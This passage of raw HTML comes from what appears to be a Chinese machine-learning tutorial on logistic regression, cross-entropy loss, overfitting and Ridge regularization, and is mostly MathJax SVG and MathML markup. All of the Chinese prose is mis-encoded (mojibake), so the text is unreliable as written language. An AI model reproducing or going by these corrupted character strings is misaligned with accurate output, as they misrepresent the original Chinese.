data-mml-node="mi" transform="translate(16758.7,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">ç±»</text></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mrow data-mjx-texclass="ORD"><mover><mi>y</mi><mo>^</mo></mover></mrow><mo>â‰¥</mo><mn>0.5</mn><mo stretchy="false">â‡’</mo><mi mathvariant="normal">é¢„</mi><mi mathvariant="normal">æµ‹</mi><mi mathvariant="normal">ä¸º</mi><mn>1</mn><mi mathvariant="normal">ç±»</mi><mspace linebreak="newline"><mrow data-mjx-texclass="ORD"><mover><mi>y</mi><mo>^</mo></mover></mrow><mtext>&lt;</mtext><mn>0.5</mn><mo stretchy="false">â‡’</mo><mi mathvariant="normal">é¢„</mi><mi mathvariant="normal">æµ‹</mi><mi mathvariant="normal">ä¸º</mi><mn>0</mn><mi mathvariant="normal">ç±»</mi></mspace></math></mjx-assistive-mml></mjx-container><h3 id="ç›´è§‚ç†è§£">ç›´è§‚ç†è§£</h3><p>æƒ³è±¡ä½ è¦åˆ¤æ–­ä¸€ä¸ªäººæ˜¯å¦æ‚£æœ‰æŸç§ç—…ï¼š</p><ul><li>ä½ æ‹¿åˆ°ä»–çš„ä¸€äº›æŒ‡æ ‡ï¼ˆå¦‚å¹´é¾„ã€è¡€å‹ã€ä½“é‡ï¼‰ã€‚</li><li>æŠŠè¿™äº›æŒ‡æ ‡å¸¦å…¥æ¨¡å‹ï¼Œæ¨¡å‹è¾“å‡ºä¸€ä¸ªæ¦‚ç‡ï¼Œæ¯”å¦‚ 0.82ã€‚</li><li>è¡¨ç¤ºè¿™ä¸ªäººæœ‰ 82% çš„æ¦‚ç‡æ‚£ç—…ï¼Œäºæ˜¯ä½ é¢„æµ‹ä»–&quot;æ‚£ç—…&quot;ã€‚</li></ul><h3 id="æŸå¤±å‡½æ•°ï¼šäº¤å‰ç†µæŸå¤±">æŸå¤±å‡½æ•°ï¼šäº¤å‰ç†µæŸå¤±</h3><p>é€»è¾‘å›å½’ä½¿ç”¨ <strong>äº¤å‰ç†µï¼ˆCross Entropyï¼‰æŸå¤±å‡½æ•°</strong>æ¥è¡¡é‡é¢„æµ‹ä¸çœŸå®æ ‡ç­¾çš„å·®è·ï¼š</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="37.175ex" height="2.398ex" role="img" focusable="false" viewbox="0 -810 16431.2 1060" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mtext"><path data-c="4C" d="M128 622Q121 629 117 631T101 634T58 637H25V683H36Q48 680 182 680Q324 680 348 683H360V637H333Q273 637 258 635T233 622L232 342V129Q232 57 237 52Q243 47 313 47Q384 47 410 53Q470 70 498 110T536 221Q536 226 537 238T540 261T542 272T562 273H582V268Q580 265 568 137T554 5V0H25V46H58Q100 47 109 49T128 61V622Z" style="stroke-width: 3;"/><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(625,0)" style="stroke-width: 3;"/><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(1125,0)" style="stroke-width: 3;"/><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(1519,0)" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2190.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(3246.6,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(4024.6,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(4302.6,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(4959.2,0)"><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z" style="stroke-width: 3;"/><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(278,0)" style="stroke-width: 3;"/><path data-c="67" d="M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z" transform="translate(778,0)" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(6237.2,0)"><path data-c="2061" d="" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(6237.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(6626.2,0)"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(300.6,16) translate(-250 0)"><path data-c="5E" d="M112 560L249 694L257 686Q387 562 387 560L361 531Q359 532 303 581L250 627L195 580Q182 569 169 557T148 538L140 532Q138 530 125 546L112 560Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(7116.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(7727.4,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(8727.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(9116.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(9838.9,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(10839.1,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(11329.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(11884.8,0)"><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z" style="stroke-width: 3;"/><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(278,0)" style="stroke-width: 3;"/><path data-c="67" d="M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z" transform="translate(778,0)" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(13162.8,0)"><path data-c="2061" d="" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(13162.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(13551.8,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(14274,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(15274.2,0)"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(300.6,16) translate(-250 0)"><path data-c="5E" d="M112 560L249 694L257 686Q387 562 387 560L361 531Q359 532 303 581L250 627L195 580Q182 569 169 557T148 538L140 532Q138 530 125 546L112 560Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(15764.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(16153.2,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mtext>Loss</mtext><mo>=</mo><mo>âˆ’</mo><mo stretchy="false">[</mo><mi>y</mi><mi>log</mi><mo data-mjx-texclass="NONE">â¡</mo><mo stretchy="false">(</mo><mrow data-mjx-texclass="ORD"><mover><mi>y</mi><mo stretchy="false">^</mo></mover></mrow><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mn>1</mn><mo>âˆ’</mo><mi>y</mi><mo stretchy="false">)</mo><mi>log</mi><mo data-mjx-texclass="NONE">â¡</mo><mo stretchy="false">(</mo><mn>1</mn><mo>âˆ’</mo><mrow data-mjx-texclass="ORD"><mover><mi>y</mi><mo stretchy="false">^</mo></mover></mrow><mo stretchy="false">)</mo><mo stretchy="false">]</mo></math></mjx-assistive-mml></mjx-container><p>è¿™ä¸ªå‡½æ•°å¯¹æ¦‚ç‡æ¥è¿‘çœŸå®å€¼çš„é¢„æµ‹ç»™äºˆæ›´ä½çš„æƒ©ç½šï¼Œå¯¹é”™è¯¯é¢„æµ‹æƒ©ç½šå¤§ã€‚</p><h3 id="åº”ç”¨åœºæ™¯">åº”ç”¨åœºæ™¯</h3><ul><li><p>åƒåœ¾é‚®ä»¶åˆ†ç±»</p></li><li><p>ç”¨æˆ·æ˜¯å¦ä¼šç‚¹å‡»å¹¿å‘Š</p></li><li><p>ä¿¡ç”¨å¡æ¬ºè¯ˆæ£€æµ‹</p></li><li><p>åŒ»ç–—è¯Šæ–­ï¼ˆæ˜¯å¦æ‚£ç—…ï¼‰</p></li></ul><h3 id="å®éªŒä»£ç ">å®éªŒä»£ç </h3><p>å®éªŒä»£ç å‚è€ƒ<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p><h2 id="è¿‡æ‹Ÿåˆ-Overfitting">è¿‡æ‹Ÿåˆ(Overfitting)</h2><p><strong>è¿‡æ‹Ÿåˆ</strong>æ˜¯æŒ‡ä¸€ä¸ªæ¨¡å‹åœ¨<strong>è®­ç»ƒæ•°æ®ä¸Šè¡¨ç°å¾ˆå¥½ï¼Œä½†åœ¨æ–°æ•°æ®ï¼ˆæµ‹è¯•é›†ï¼‰ä¸Šè¡¨ç°å¾ˆå·®</strong>ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒâ€œå­¦å¾—å¤ªå¥½äº†â€ï¼Œä»¥è‡³äº<strong>å­¦ä¼šäº†è®­ç»ƒæ•°æ®çš„å™ªå£°å’Œç»†èŠ‚ï¼Œè€Œä¸æ˜¯é€šç”¨çš„æ¨¡å¼</strong>ã€‚</p><h3 id="ä¸¾ä¸ªä¾‹å­">ä¸¾ä¸ªä¾‹å­</h3><p>å‡è®¾ä½ æƒ³ç”¨æœºå™¨å­¦ä¹ åˆ¤æ–­ä¸€ä¸ªäººæ˜¯å¦ä¼šä¹°å†°æ·‡æ·‹ï¼Œè¾“å…¥ç‰¹å¾æ˜¯æ¸©åº¦ï¼š</p><ul><li>ä½ æœ‰10ä¸ªè®­ç»ƒæ ·æœ¬ï¼ŒæŸä¸ªæ¨¡å‹åˆšå¥½åœ¨è¿™10ä¸ªç‚¹ä¸Šæ‹Ÿåˆå¾—éå¸¸å®Œç¾ï¼ˆå‡†ç¡®ç‡100%ï¼‰ã€‚</li><li>ä½†å½“ä½ æ‹¿æ–°çš„å¤©æ°”æ•°æ®æµ‹è¯•æ—¶ï¼Œå®ƒçš„åˆ¤æ–­å˜å¾—å¾ˆå·®ã€‚</li></ul><p>è¿™ç§æƒ…å†µå°±å«<strong>è¿‡æ‹Ÿåˆ</strong>ã€‚</p><h3 id="é˜²æ­¢è¿‡æ‹Ÿåˆ">é˜²æ­¢è¿‡æ‹Ÿåˆ</h3><p>é˜²æ­¢è¿‡æ‹Ÿåˆæœ‰ä»¥ä¸‹æ–¹æ³•ï¼š</p><ol><li><p>æ”¶é›†æ›´å¤šçš„æ•°æ®</p></li><li><p>é€‰æ‹©ç‰¹å¾</p></li><li><p>å‡å°‘å‚æ•°çš„å¤§å°</p><p>æ­£åˆ™åŒ–(<code>Regularization</code>)</p></li></ol><h2 id="æ­£åˆ™åŒ–">æ­£åˆ™åŒ–</h2><p>åœ¨è®­ç»ƒæ¨¡å‹æ—¶ï¼Œå¦‚æœä¸åŠ æ§åˆ¶ï¼Œæ¨¡å‹å¯èƒ½ä¼šå­¦å¾—éå¸¸â€œè´´åˆâ€è®­ç»ƒæ•°æ®ï¼ˆè¿‡æ‹Ÿåˆï¼‰ã€‚<br>æ­£åˆ™åŒ–é€šè¿‡åœ¨æŸå¤±å‡½æ•°ä¸­æ·»åŠ ä¸€é¡¹â€œæƒ©ç½šé¡¹â€ï¼Œ<strong>é¼“åŠ±æ¨¡å‹å‚æ•°æ›´å°æˆ–æ›´ç¨€ç–</strong>ï¼Œä»è€Œé¿å…å¤æ‚æ¨¡å‹ã€‚</p><h3 id="æ­£åˆ™åŒ–-Ridgeæ­£åˆ™">æ­£åˆ™åŒ–(Ridgeæ­£åˆ™)</h3><ul><li>æƒ©ç½šé¡¹ï¼šæ‰€æœ‰æƒé‡çš„å¹³æ–¹å’Œ</li></ul><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -2.697ex;" xmlns="http://www.w3.org/2000/svg" width="27.108ex" height="4.847ex" role="img" focusable="false" viewbox="0 -950 11981.9 2142.2" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mtext"><path data-c="4C" d="M128 622Q121 629 117 631T101 634T58 637H25V683H36Q48 680 182 680Q324 680 348 683H360V637H333Q273 637 258 635T233 622L232 342V129Q232 57 237 52Q243 47 313 47Q384 47 410 53Q470 70 498 110T536 221Q536 226 537 238T540 261T542 272T562 273H582V268Q580 265 568 137T554 5V0H25V46H58Q100 47 109 49T128 61V622Z" style="stroke-width: 3;"/><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(625,0)" style="stroke-width: 3;"/><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(1125,0)" style="stroke-width: 3;"/><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(1519,0)" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2190.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(3246.6,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">åŸ</text><text data-variant="normal" transform="translate(1000,0) scale(1,-1)" font-size="884px" font-family="serif">å§‹</text><text data-variant="normal" transform="translate(2000,0) scale(1,-1)" font-size="884px" font-family="serif">æŸ</text><text data-variant="normal" transform="translate(3000,0) scale(1,-1)" font-size="884px" font-family="serif">å¤±</text></g><g data-mml-node="mo" transform="translate(7468.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(8469,0)"><path data-c="1D706" d="M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z" style="stroke-width: 3;"/></g><g data-mml-node="munder" transform="translate(9218.7,0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(600,-1084.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 